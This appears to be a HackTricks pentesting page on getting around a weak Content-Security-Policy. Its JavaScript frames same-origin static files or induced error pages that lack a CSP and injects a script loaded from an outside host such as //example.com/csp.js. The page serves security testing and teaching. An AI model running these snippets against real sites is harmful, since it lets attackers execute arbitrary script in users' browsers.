# CSP Bypass via `'self'`, `'unsafe-inline'`, and Iframes

{{#include ../../banners/hacktricks-training.md}}

Consider this policy:

```
Content-Security-Policy: default-src 'self' 'unsafe-inline';
```

Because `script-src` is absent, `default-src` is its fallback. The policy allows same-origin scripts and inline scripts, but it does **not** allow string-to-code APIs such as `eval()` or string arguments to `setTimeout()` and `setInterval()` because `'unsafe-eval'` is absent. It also uses `default-src` as the fallback for several other resource types.<sup>[[1]](#references)</sup>

This is already a weak CSP: `'unsafe-inline'` permits inline JavaScript. The iframe technique below matters when an attacker can execute inline code in the protected parent but needs a less restricted same-origin child document to load another script.<sup>[[1]](#references)[[2]](#references)</sup>

## Via Text & Images

Some browser and server combinations render a same-origin text or image response placed in an iframe as a document. Common candidates include `robots.txt`, `favicon.ico`, stylesheets, and other static resources. If that response has no CSP of its own and remains same-origin, script in the parent may be able to access the child DOM and append a script element. This behavior is content-type-, header-, and browser-dependent; verify it on the exact target rather than treating it as universal.<sup>[[2]](#references)</sup>

```javascript
frame = document.createElement("iframe")
frame.onload = () => {
  script = document.createElement("script")
  script.src = "//example.com/csp.js"
  frame.contentDocument.head.appendChild(script)
}
frame.src = "/css/bootstrap.min.css"
document.body.appendChild(frame)
```

## Via Errors

An application or reverse proxy may also return same-origin error documents without the normal CSP. If such a response can be framed and accessed by the parent, it can provide the same less-restricted child context.<sup>[[2]](#references)</sup>

```javascript
// Inducing an nginx error
frame = document.createElement("iframe")
frame.src = "/%2e%2e%2f"
document.body.appendChild(frame)

// Triggering an error with a long URL
frame = document.createElement("iframe")
frame.src = "/" + "A".repeat(20000)
document.body.appendChild(frame)

// Generating an error via extensive cookies
for (var i = 0; i < 5; i++) {
  document.cookie = i + "=" + "a".repeat(4000)
}
frame = document.createElement("iframe")
frame.src = "/"
document.body.appendChild(frame)
// Remove the test cookies after execution.
for (var i = 0; i < 5; i++) {
  document.cookie = i + "=; Max-Age=0; path=/"
}
```

When using one of the error responses, attach the handler before navigating the frame so that the child document is fully loaded before it is modified:

```javascript
frame.onload = () => {
  script = document.createElement("script")
  script.src = "//example.com/csp.js"
  frame.contentDocument.head.appendChild(script)
}
```

## References

- [1] [W3C - Content Security Policy Level 3](https://www.w3.org/TR/CSP/)
- [2] [Wallarm - How to trick CSP into letting you run external JavaScript](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/)

{{#include ../../banners/hacktricks-training.md}}
